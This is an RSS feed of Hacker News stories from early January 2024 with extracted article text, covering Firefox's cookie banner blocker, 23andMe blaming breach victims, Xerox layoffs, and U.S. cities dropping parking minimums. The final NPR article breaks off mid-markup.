<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 03 Jan 2024 21:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Niklaus Wirth has died (689 pts)]]></title>
            <link>https://twitter.com/Bertrand_Meyer/status/1742613897675178347</link>
            <guid>38858012</guid>
            <pubDate>Wed, 03 Jan 2024 18:50:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/Bertrand_Meyer/status/1742613897675178347">https://twitter.com/Bertrand_Meyer/status/1742613897675178347</a>, See on <a href="https://news.ycombinator.com/item?id=38858012">Hacker News</a></p>
Couldn't get https://twitter.com/Bertrand_Meyer/status/1742613897675178347: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Ambiphone, no-nonsense ambient music and white noise (118 pts)]]></title>
            <link>https://ambiph.one?hn</link>
            <guid>38856999</guid>
            <pubDate>Wed, 03 Jan 2024 17:41:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ambiph.one?hn">https://ambiph.one?hn</a>, See on <a href="https://news.ycombinator.com/item?id=38856999">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Block cookie banners on Firefox (132 pts)]]></title>
            <link>https://support.mozilla.org/en-US/kb/cookie-banner-reduction</link>
            <guid>38856515</guid>
            <pubDate>Wed, 03 Jan 2024 17:07:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://support.mozilla.org/en-US/kb/cookie-banner-reduction">https://support.mozilla.org/en-US/kb/cookie-banner-reduction</a>, See on <a href="https://news.ycombinator.com/item?id=38856515">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
      
      
      <main role="main">
      
      
  <section id="document-list">
    <header>
      <div>
          
          <p><a href="https://support.mozilla.org/en-US/products/firefox" title="Firefox">
            <img src="https://assets-prod.sumo.prod.webservices.mozgcp.net/media/uploads/products/2020-04-14-08-36-13-8dda6f.png" height="48" width="48" alt="">
          </a></p>

          
        </div>
    </header>

    <article>
      
  
  
      <section id="doc-content">
    
      <div id="toc"><h2>Table of Contents</h2><ul><li><a href="#w_why-are-cookie-banners-a-problem"><span>1</span> <span>Why are cookie banners a problem?</span></a></li><li><a href="#w_how-it-works"><span>2</span> <span>How it works</span></a></li><li><a href="#w_which-banners-are-blocked"><span>3</span> <span>Which banners are blocked?</span></a></li><li><a href="#w_get-started"><span>4</span> <span>Get started</span></a></li><li><a href="#w_customize-your-experience"><span>5</span> <span>Customize Your Experience</span></a></li><li><a href="#w_integrated-cookie-protections"><span>6</span> <span>Integrated cookie protections</span></a></li><li><a href="#w_why-germany-and-private-browsing-mode"><span>7</span> <span>Why Germany and private browsing mode?</span></a></li></ul></div>
<p>Since the development of stricter consumer privacy laws that specifically target the usage and retention of user data, such as <a href="https://wikipedia.org/wiki/General_Data_Protection_Regulation">GDPR</a>, websites have adopted legal notices to inform users that they are using technologies such as cookies to store data on the user's device. To address the increasing frustration caused by these cookie banners on websites, <a href="https://support.mozilla.org/en-US/kb/find-what-version-firefox-you-are-using">Firefox version</a> 120 introduces the cookie banner blocker. This feature is designed to make your browsing experience smoother by taking care of these annoying banners automatically. In this article, we'll show you how it works now, and how we intend to expand on it in the future.
</p>

<p>Before we dive into the solution, let's understand why cookie banners can be a hassle:
</p>
<ul><li><strong>Annoying prompts:</strong> Cookie banners, as you've likely experienced, can be quite annoying. They interrupt your browsing to ask a question that can often be confusing and irrelevant to your browsing, before allowing you to refocus on why you navigated to that site in the first place. Their goal being to create a sense of urgency, making it feel like you must choose between trading your data for access to the site, or navigating away in hopes of protecting your privacy.
</li><li><strong>Deceptive designs:</strong> Many websites employ tricky tactics when it comes to their cookie banners. They may design them in a way that makes it difficult for you to customize your settings. For example, they might make the <span>Accept All Cookies</span> button prominent, colorful and appealing, while burying the <strong>Customize Settings</strong> option in small text or a less noticeable location. This design choice can be misleading, effectively nudging users towards accepting all cookies without considering the consequences.
</li><li><strong>Prompt fatigue:</strong> The sheer volume of cookie banners that users encounter daily can lead to what we call “prompt fatigue”. This phenomenon occurs when users are bombarded with these pop-ups so frequently that they ignore or mindlessly accept them without actually reading the contents or understanding the implications (assuming they are written in a manner that is easy to understand in the first place). Sites effectively betting that you would trade your data to save you the several seconds of your life it takes to opt out over and over again. In this environment, the websites that employ the most deceptive patterns gain an unfair advantage, as they effectively exploit this fatigue to get you to hand over your data, even when it is not needed.
</li></ul>
<h2 id="w_how-it-works">How it works</h2>
<p>When it comes to handling those cookie banners, the cookie banner blocker employs two clever methods:
</p>
<ul><li><strong>Cookie Injection:</strong> This method involves setting an “opt-out” cookie whenever possible. Think of it like a digital note that tells the website, “I don't want to see this banner again.” It's a preemptive way of getting rid of those banners before they even have a chance to appear.
</li><li><strong>Auto Click CSS Selector:</strong> In cases where setting an opt-out cookie isn't an option, the Cookie Banner Blocker uses another technique. It effectively clicks on the banner's “decline” or “reject” option in a way that mimics what you might do manually. This action dismisses the banner as if you made a choice yourself.
</li></ul>
<p>So, in a nutshell, the cookie banner blocker is like your automated assistant that takes care of annoying cookie banners by either preemptively telling the website you opt out or by clicking on your behalf to make them go away. This way, you can spend less time opting out and more time browsing.
</p>

<p>The cookie banner blocker works by using a careful selection of websites that we've put together. We've compiled this list by considering the most frequently visited sites in our key regions to have the broadest impact. We're actively working to expand this coverage by incorporating support for consent management platforms and other top sites we haven’t gotten to yet.
</p>
<h2 id="w_get-started">Get started</h2>
<p>The cookie banner blocker is available starting from Firefox version 120, and it's automatically enabled for users in Germany browsing in Private Browsing Mode. Here's how you can make the most of it:
</p>
<ol><li><strong>Visit supported websites:</strong> The cookie banner blocker works on websites that have a decline option in their cookie banners.
</li><li><strong>Automatic decline:</strong> When you visit a supported website, if the banner has a decline option, Firefox will automatically decline it for you.
</li><li><strong>Enjoy the benefits:</strong> You can now browse without the interruption of annoying cookie banners.
</li></ol>
<h2 id="w_customize-your-experience">Customize Your Experience</h2>
<p>If you want to enable or disable the cookie banner blocker for specific websites or altogether, here's how:
</p>
<ul><li><strong>Enable:</strong> By default, it's on in private windows for users in Germany.
</li><li><strong>Disable:</strong> You can turn it off through preferences if you wish.
</li></ul>
<h2 id="w_integrated-cookie-protections">Integrated cookie protections</h2>
<p>Firefox has additional cookie protections that work seamlessly with the cookie banner blocker:
</p>
<ul><li><strong><a href="https://support.mozilla.org/en-US/kb/introducing-total-cookie-protection-standard-mode">Total Cookie Protection (TCP)</a>:</strong> This limits the impact of tracking cookies, regardless of banner interactions.
</li><li><strong><a href="https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop">Enhanced Tracking Protection (ETP)</a> Strict Mode:</strong> Automatically blocks third-party cookies.
</li></ul>
<h2 id="w_why-germany-and-private-browsing-mode">Why Germany and private browsing mode?</h2>
<p>Our initial launch in Germany and private browsing mode has specific reasons:
</p>
<ul><li>Private browsing mode displays cookie banners repeatedly, making this feature especially useful. Germany, as a part of the European Union, is a prominent market where cookie banners are noticeable due to GDPR.
</li><li>We plan to gather insights from this launch before potentially expanding the feature to a broader audience.
</li></ul>
<p>By following these instructions, you can take full advantage of the cookie banner blocker in Firefox, simplifying your online experience while ensuring your privacy. Happy browsing!
</p>
    
  </section>

      
      
      
      
        
      
    </article>

    

    <section id="doc-contributors">
    <p>These fine people helped write this article:</p> 
  </section>

    <div>
    <p><img src="https://assets-prod.sumo.prod.webservices.mozgcp.net/static/volunteer.a3be8d331849774b.png" alt="Illustration of hands"></p><div>
      <h3>Volunteer</h3>
      <p>Grow and share your expertise with others. Answer questions and improve our knowledge base.</p>
      <p><strong><a href="https://support.mozilla.org/en-US/contribute">Learn More</a></strong></p>
    </div>
  </div>

    
      
  

    

  </section>

      </main>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[23andMe tells victims it's their fault that their data was breached (202 pts)]]></title>
            <link>https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/</link>
            <guid>38856412</guid>
            <pubDate>Wed, 03 Jan 2024 16:59:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/">https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/</a>, See on <a href="https://news.ycombinator.com/item?id=38856412">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Facing <a href="https://www.law.com/radar/card/with-data-breach-lawsuits-mounting-23andme-moves-for-california-mdl-403-96744/">more than 30 lawsuits</a> from victims of its massive data breach, 23andMe is now deflecting the blame to the victims themselves in an attempt to absolve itself from any responsibility, <a href="https://www.documentcloud.org/documents/24252535-response-letter-to-tycko-zavareei-llp">according to a letter sent to a group of victims seen by TechCrunch</a>.</p>
<p>“Rather than acknowledge its role in this data security disaster, 23andMe has apparently decided to leave its customers out to dry while downplaying the seriousness of these events,” Hassan Zavareei, one of the lawyers representing the victims who received the letter from 23andMe, told TechCrunch in an email.</p>
<p>In December, 23andMe admitted that <a href="https://techcrunch.com/2023/12/04/23andme-confirms-hackers-stole-ancestry-data-on-6-9-million-users/">hackers had stolen the genetic and ancestry data of 6.9 million users</a>, nearly half of all its customers.</p>
<p>The data breach started with hackers accessing only around 14,000 user accounts. The hackers broke into this first set of victims by <a href="https://techcrunch.com/2023/10/10/23andme-resets-user-passwords-after-genetic-data-posted-online/">brute-forcing accounts with passwords that were known to be associated with the targeted customers</a>, a technique known as credential stuffing.</p>
<p>From these 14,000 initial victims, however, the hackers were able to then access the personal data of the other 6.9 million million victims because they had opted-in to 23andMe’s <a href="https://customercare.23andme.com/hc/en-us/articles/212170838">DNA Relatives</a> feature. This optional feature allows customers to automatically share some of their data with people who are considered their relatives on the platform.</p>
<p>In other words, by hacking into only 14,000 customers’ accounts, the hackers subsequently scraped personal data of another 6.9 million customers whose accounts were not directly hacked.</p>
<p>But in a letter sent to a group of hundreds of 23andMe users who are now suing the company, 23andMe said that “users negligently recycled and failed to update their passwords following these past security incidents, which are unrelated to 23andMe.”</p>
<p>“Therefore, the incident was not a result of 23andMe’s alleged failure to maintain reasonable security measures,” the letter reads.</p>
<p>Zavareei said that 23andMe is “shamelessly” blaming the victims of the data breach.</p>
<p>“This finger pointing is nonsensical. 23andMe knew or should have known that many consumers use recycled passwords and thus that 23andMe should have implemented some of the many safeguards available to protect against credential stuffing — especially considering that 23andMe stores personal identifying information, health information, and genetic information on its platform,” Zavareei said in an email.</p>
<p>“The breach impacted millions of consumers whose data was exposed through the DNA Relatives feature on 23andMe’s platform, not because they used recycled passwords. Of those millions, only a few thousand accounts were compromised due to credential stuffing. 23andMe’s attempt to shirk responsibility by blaming its customers does nothing for these millions of consumers whose data was compromised through no fault of their own whatsoever,” said Zavareei.</p>
<div>
		<h4>Contact Us</h4><p>
		Do you have more information about the 23andMe incident? We’d love to hear from you. You can contact Lorenzo Franceschi-Bicchierai securely on Signal at +1 917 257 1382, or via Telegram, Keybase and Wire @lorenzofb, or email lorenzo@techcrunch.com. You also can contact TechCrunch via SecureDrop.	</p></div>
	
<p>In response to 23andMe’s letter, Dante Termohs, a 23andMe customer who was impacted by the data breach, told TechCrunch that he found “it appalling that 23andMe is attempting to hide from consequences instead of helping its customers.”</p>
<p>23andMe’s lawyers argued that the stolen data cannot be used to inflict monetary damage against the victims.</p>
<p>“The information that was potentially accessed cannot be used for any harm. As explained in the October 6, 2023 blog post, the profile information that may have been accessed related to the DNA Relatives feature, which a customer creates and chooses to share with other users on 23andMe’s platform. Such information would only be available if plaintiffs affirmatively elected to share this information with other users via the DNA Relatives feature. Additionally, the information that the unauthorized actor potentially obtained about plaintiffs could not have been used to cause pecuniary harm (it did not include their social security number, driver’s license number, or any payment or financial information),” the letter read.</p>
<p>23andMe and one of its lawyers did not respond to TechCrunch’s request for comment.</p>
<p>After disclosing the breach, 23andMe reset all customer passwords, and then <a href="https://techcrunch.com/2023/11/07/23andme-ancestry-myheritage-two-factor-by-default/">required all customers to use multi-factor authentication</a>, which was only optional before the breach.</p>
<p>In an attempt to pre-empt the inevitable class action lawsuits and mass arbitration claims, <a href="https://techcrunch.com/2023/12/11/23andme-changes-to-terms-of-service-are-cynical-and-self-serving-lawyers-say/">23andMe changed its terms of service to make it more difficult for victims to band together</a> when filing a legal claim against the company. Lawyers with experience representing data breach victims told TechCrunch that the changes were “cynical,” “self-serving,” and “a desperate attempt” to protect itself and deter customers from going after the company.</p>
<p>Clearly, the changes didn’t stop what is now a flurry of <a href="https://topclassactions.com/lawsuit-settlements/privacy/data-breach/23andme-hit-with-another-class-action-lawsuit-over-data-breach/">class action lawsuits</a>.</p>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xerox to cut 15% of its workforce (105 pts)]]></title>
            <link>https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html</link>
            <guid>38855621</guid>
            <pubDate>Wed, 03 Jan 2024 16:05:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html">https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html</a>, See on <a href="https://news.ycombinator.com/item?id=38855621">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-6" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-6-2"><div id="ArticleBody-InlineImage-106258696" data-test="InlineImage"><p>Signage is displayed outside the Xerox headquarters in Norwalk, Connecticut.</p><p>Michael Nagle | Bloomberg | Getty Images</p></div><div><p><span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-1"><a href="https://www.cnbc.com/quotes/XRX/">Xerox</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> on Wednesday announced it will cut 15% of its workforce as part of a plan to implement a new organizational structure and operating model.</p><p>Xerox, which offers digital printing and document management technologies, had about 20,500 employees as of Dec. 31, 2022, according to a filing with the U.S. Securities and Exchange Commission. Based on this figure, Wednesday's layoffs will affect about 3,075 employees.</p><p>Shares of Xerox fell more than 9% following the announcement Wednesday.</p><p>The company's restructuring plan involves simplifying its products within its core print business, increasing efficiency across its global business services and boosting focus on IT and other digital services, according to <a href="https://www.news.xerox.com/news/xerox-reinvention-and-operating-model-evolution" target="_blank">a release</a>. Xerox said it also redesigned its executive team to help carry out the new model.</p><p><em>"</em>The shift to a business unit operating model is a continuation of our client-focused, balanced execution priorities and is designed to accelerate product and services, go-to-market, and corporate functions' operating efficiencies across all geographies we serve," Xerox CEO Steven Bandrowczak said in the release.</p><p>Xerox will carry out the cuts this quarter, according to the release. A representative for Xerox did not comment beyond the release.<br><em><strong><br>Don't miss these stories from CNBC PRO:</strong></em></p><ul><li><a href="https://www.cnbc.com/2024/01/01/these-stocks-will-be-the-biggest-sp-500-winners-of-2024-according-to-analysts.html"><em>These stocks will be the biggest S&amp;P 500 winners of 2024, according to analysts</em></a></li><li><a href="https://www.cnbc.com/2024/01/01/heres-where-to-invest-50000-in-the-new-year-according-to-the-pros.html"><em>Here's where to invest $50,000 in the new year, according to the pros</em></a></li><li><a href="https://www.cnbc.com/2023/12/28/could-a-bitcoin-etf-approval-be-a-sell-the-news-event-what-investors-are-expecting-on-the-big-day.html"><em>Could a bitcoin ETF approval be a sell-the-news event? Here's what to expect if it happens</em></a></li><li><a href="https://www.cnbc.com/2023/12/29/these-stocks-will-be-the-biggest-dow-winners-of-2024-according-to-analysts.html"><em>These stocks will be the biggest Dow winners of 2024, according to analysts</em></a></li><li><a href="https://www.cnbc.com/2023/12/25/oprahs-flip-on-weight-loss-drugs-is-a-sign-of-whats-to-come-for-the-ozempic-trade-in-2024.html"><em>Oprah's flip on weight loss drugs is a sign of what's to come for the 'Ozempic trade' in 2024</em></a></li></ul></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. cities opt to ditch their off-street parking minimums (131 pts)]]></title>
            <link>https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development</link>
            <guid>38855427</guid>
            <pubDate>Wed, 03 Jan 2024 15:49:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development">https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development</a>, See on <a href="https://news.ycombinator.com/item?id=38855427">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="storytext">
      <div id="res1221480452">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s400-c85.webp 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200-c85.webp 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                Austin, Texas, is the country's largest city to toss out its requirements for off-street car parking. The city hopes removing the mandates will encourage other modes of transportation and help housing affordability.
                <b aria-label="Image credit">
                    
                    Brandon Bell/Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Brandon Bell/Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg">
        </picture>
    </div>
<div>
        <p>Austin, Texas, is the country's largest city to toss out its requirements for off-street car parking. The city hopes removing the mandates will encourage other modes of transportation and help housing affordability.</p>
        <p><span aria-label="Image credit">
            
            Brandon Bell/Getty Images
            
        </span>
    </p></div>
   </div>
   <p>The city council in Austin, Texas recently proposed something that could seem like political Kryptonite: getting rid of parking minimums.</p>   <p>Those are the rules that dictate how much off-street parking developers must provide — as in, a certain number of spaces for every apartment and business.</p>   <p>Around the country, cities are throwing out their own <a href="https://www.npr.org/2023/05/09/1175035781/how-parking-explains-everything">parking requirements</a> – hoping to end up with less parking, more affordable housing, better transit, and walkable neighborhoods.</p>   <p>Some Austinites were against tossing the rules.</p>   <p>"Austin has developed as a low density city without adequate mass transportation system," said resident Malcolm Yeatts. "Austin citizens cannot give up their cars. Eliminating adequate parking for residents will only increase the flight of the middle class and businesses to the suburbs."</p>   
   
   
<!-- END ID="RES1221846111" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>But much more numerous were voices in support of eliminating the minimums and the impact they've had on housing costs, congestion, and walkability.</p>   <p>"I think our country has used its land wastefully, like a drunk lottery winner that's squandered their newfound wealth," said resident Tai Hovanky. "We literally <a href="https://jonimitchell.com/music/song.cfm?id=13">paved paradise and put up a parking lot</a>."</p>   <p>The amendment <a href="https://www.kut.org/austin/2023-11-02/austin-becomes-one-of-the-largest-cities-in-the-country-to-get-rid-of-parking-requirements">sailed through the council</a> — making Austin the biggest city in the country to eliminate its parking mandates citywide. </p>   <h3>Dozens of cities have ditched parking minimums</h3>   <p>But it's not just Austin. More than 50 other cities and towns have thrown out their minimums, from <a href="https://www.muni.org/Departments/Assembly/PressReleases/Pages/Parking-Minimum-Ordinance.aspx#:~:text=At%20the%20November%2022%20Assembly,Volland%2C%20Kevin%20Cross%20and%20Forrest">Anchorage, Alaska</a><strong>,</strong> and <a href="https://www.sanjoseca.gov/your-government/departments-offices/planning-building-code-enforcement/planning-division/ordinances-proposed-updates/parking-policy-evaluation#:~:text=Ordinances%20%26%20Proposed%20Updates-,Parking%20and%20Transportation%20Demand%20Management%20(TDM)%20Ordinance%20Update,favor%20other%20modes%20of%20transportation.">San Jose, Calif.</a>, to <a href="https://warrington.ufl.edu/due-diligence/2023/07/17/parking-puzzle/">Gainesville, Fla.</a> </p>   <p>"They're all just dead weight," says Tony Jordan, the president of the <a href="https://parkingreform.org/">Parking Reform Network</a>, of parking minimums. One issue is just how arbitrary they can be.</p>   <p>Take bowling alleys.<strong> </strong>Jordan says the number of required parking spots per bowling lane could vary anywhere from two to five, in cities right next to each other.</p>   <p>"What's the difference between a bowler in city A and city B? Nothing. It's just these codes were put in ... very arbitrarily back 30 or 40 years ago and they're very hard to change because anytime the city wants to change them, there's a whole big hoopla," he says.</p>   <div id="res1221480225">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s400-c85.webp 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200-c85.webp 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                San Francisco is one of many U.S. cities that has thrown out its parking minimums in recent years.
                <b aria-label="Image credit">
                    
                    Justin Sullivan/Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Justin Sullivan/Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg">
        </picture>
    </div>
<div>
        <p>San Francisco is one of many U.S. cities that has thrown out its parking minimums in recent years.</p>
        <p><span aria-label="Image credit">
            
            Justin Sullivan/Getty Images
            
        </span>
    </p></div>
   </div>
   <p>Random as these rules can be, they have major consequences: Parking creates sprawl and makes neighborhoods less walkable. Asphalt traps heat and creates runoff. And parking minimums can add <em>major</em> costs to building new housing: a single space in a parking structure can cost $50,000 or more.</p>   
   <p><a href="https://www.accessmagazine.org/spring-2017/the-hidden-cost-of-bundled-parking/">One 2017 study</a> found that including garage parking increased the rent of a housing unit by about 17 percent.</p>   
   
<!-- END ID="RES1221847238" CLASS="BUCKETWRAP INTERNALLINK MEDIAPROMO PRIMARY" -->
   <p>The real problem, says Jordan, is what <em>doesn't</em> get built: "The housing that could have gone in that space or the housing that wasn't built because the developer couldn't put enough parking. ... So we just lose housing in exchange for having convenient places to store cars."</p>   <h3>A move to let the market decide</h3>   <p>Austin City Council member Zo Qadri was the lead sponsor on the resolution to remove parking mandates there. He emphasizes that getting rid of parking mandates isn't the same thing as getting rid of parking: "It simply lets the market and individual property owners decide what levels of parking are appropriate or needed." </p>   <p>Austin removed parking requirements for its downtown area a decade ago, "and the market has still provided plenty of parking in the vast majority of the projects since then," says Qadri.</p>   <p>A new survey from Pew Charitable Trusts <a href="https://www.pewtrusts.org/-/media/assets/2023/11/zoning-survey-toplines-and-methods.pdf">found that 62% of Americans</a> support property owners and builders to make decisions about the number of off-street parking spaces, instead of local governments.</p>   <p>Angela Greco, a 36-year-old musician and copywriter in Austin, is one of them. She drives, but prefers to walk or take transit. She's not worried that doing away with the old rules will make it too hard to find a place to park.</p>   <p>"I've lived in like cities where it's way more difficult, like New York and L.A.," Greco says. "Parking just isn't that difficult in Austin to me to begin with, even in really dense areas."</p>   <div id="res1221480741">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s400-c85.webp 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200-c85.webp 1200w,
